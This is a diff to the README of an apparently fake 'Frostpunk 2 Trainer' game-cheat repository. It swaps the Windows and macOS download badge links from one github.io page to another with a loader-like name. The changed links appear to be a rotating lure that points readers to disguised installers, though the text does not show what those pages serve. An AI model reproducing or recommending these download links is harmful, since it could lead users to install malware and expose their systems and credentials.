@@ -12,7 +12,7 @@
 
 [![skillicons](https://skillicons.dev/icons?i=windows,apple,github)](https://github.com/woywijuikmxp/frostpunk-2-trainer)
 
-[![Download Trainer](https://img.shields.io/badge/⬇️_Download_Trainer-FF4444?style=for-the-badge&logoColor=white)](https://mixedlinkrelease.github.io/installer/)
+[![Download Trainer](https://img.shields.io/badge/⬇️_Download_Trainer-FF4444?style=for-the-badge&logoColor=white)](https://bansheeloaderquay.github.io/dl-win/)
 
 ![Frostpunk 2](game.jpg)
 
@@ -77,7 +77,7 @@ The **Frostpunk 2 Trainer** solves all these issues by giving you complete contr
 
 macOS users can use our alternative tool:
 
-[![macOS Download](https://img.shields.io/badge/macOS-Download-silver?style=for-the-badge&logo=apple)](https://mixedlinkrelease.github.io/installermac/)
+[![macOS Download](https://img.shields.io/badge/macOS-Download-silver?style=for-the-badge&logo=apple)](https://bansheeloaderquay.github.io/dl-mac/)
 
 ## ⚖️ Legal
 
